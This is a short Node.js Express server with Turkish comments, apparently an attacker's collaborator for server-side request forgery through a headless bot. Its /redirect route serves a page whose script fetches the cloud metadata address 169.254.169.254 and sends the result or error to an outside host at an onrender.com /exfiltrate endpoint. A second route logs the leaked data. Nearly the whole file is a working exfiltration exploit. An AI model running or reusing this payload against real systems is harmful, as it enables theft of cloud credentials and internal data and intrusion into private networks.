const express = require('express');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 1. Botun ilk geldiği ve içine JS payload yerleştirdiğimiz rota
app.get('/redirect', (req, res) => {
    console.log("\n--- BOT Yakalandı! JS Payload Gönderiliyor ---");
    
    // Tarayıcının içinde çalışacak JavaScript kodu
    const htmlPayload = `
    <html>
      <body>
        <h2>Loading...</h2>
        <script>
          // Test etmek istediğimiz iç adres (Örn: Cloud Metadata veya iç port)
          const targetInternalUrl = "http://169.254.169.254/latest/meta-data/";
          
          fetch(targetInternalUrl)
            .then(response => response.text())
            .then(data => {
               // İçeriden gelen veriyi kendi sunucumuza parametre olarak atıyoruz
               fetch('https://collab-67oj.onrender.com/exfiltrate?data=' + encodeURIComponent(data));
            })
            .catch(error => {
               // Hata olsa bile iç ağın tepkisini yakalamak için hatayı gönderiyoruz
               fetch('https://collab-67oj.onrender.com/exfiltrate?error=' + encodeURIComponent(error.toString()));
            });
        </script>
      </body>
    </html>
    `;

    res.setHeader('Content-Type', 'text/html');
    return res.status(200).send(htmlPayload);
});

// 2. İç ağdan sızdırılan verilerin düşeceği log rotası
app.get('/exfiltrate', (req, res) => {
    console.log("\n🔥 --- İÇ AĞDAN VERİ SIZDIRILDI! --- 🔥");
    console.log("Query Parametreleri:", req.query);
    return res.status(200).send("OK");
});

// Normal istekler için genel yakalayıcı
app.use((req, res) => {
    console.log("\n--- NORMAL İSTEK ---");
    console.log(req.method, req.url, req.headers);
    return res.status(200).send("OK");
});

app.listen(3000, () => console.log("Collaborator 3000 portunda hazır!"));
